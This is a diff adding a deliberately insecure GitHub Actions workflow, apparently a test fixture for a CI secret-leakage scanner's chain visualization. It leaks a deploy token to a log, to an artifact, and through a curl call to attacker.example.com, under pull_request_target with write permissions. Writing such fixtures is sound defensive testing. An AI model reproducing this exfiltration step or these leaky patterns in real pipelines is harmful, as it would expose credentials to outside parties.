@@ -1,0 +1,42 @@
+# E2E fixture for leakage-path chain visualization (`-format "{{mermaid .}}"`).
+#
+# A single privileged job that fans a shared secret out to three different
+# sink kinds, so TestChainVizE2EBlastRadius can assert the mermaid
+# blast-radius summary line reports all three (log/network/artifact).
+#
+# - echo "$TOKEN"                    -> secret-in-log        (sink=log)
+# - curl -H "x: $TOKEN" ...          -> secret-exfiltration   (sink=network)
+# - actions/upload-artifact@v3       -> secrets-in-artifacts  (sink=artifact)
+#
+# secret-in-log and secret-exfiltration both source from the same
+# `secrets.DEPLOY_TOKEN` env var, so the assembler shares one source node
+# between them (fan-out badge). secrets-in-artifacts records its source as
+# the generic "secrets.*" placeholder (see pkg/core/secretsinartifacts.go),
+# so it renders as a separate source node rather than joining the shared one.
+#
+# NOTE: secret-exfiltration only inspects *step-level* env (see
+# rule.collectEnvSecrets(step.Env) in pkg/core/secretexfiltration.go) — it
+# does not look at job-level env the way secret-in-log does — so the curl
+# step redeclares TOKEN at the step level even though it's already in scope
+# from the job-level env below.
+name: chainviz blast radius
+on: pull_request_target
+permissions:
+  contents: write
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    env:
+      TOKEN: ${{ secrets.DEPLOY_TOKEN }}
+    steps:
+      - name: leak to log
+        run: echo "$TOKEN"
+      - name: leak to network
+        env:
+          TOKEN: ${{ secrets.DEPLOY_TOKEN }}
+        run: |
+          curl -H "x: $TOKEN" https://attacker.example.com/collect
+      - name: leak to artifact
+        uses: actions/upload-artifact@v3
+        with:
+          path: .
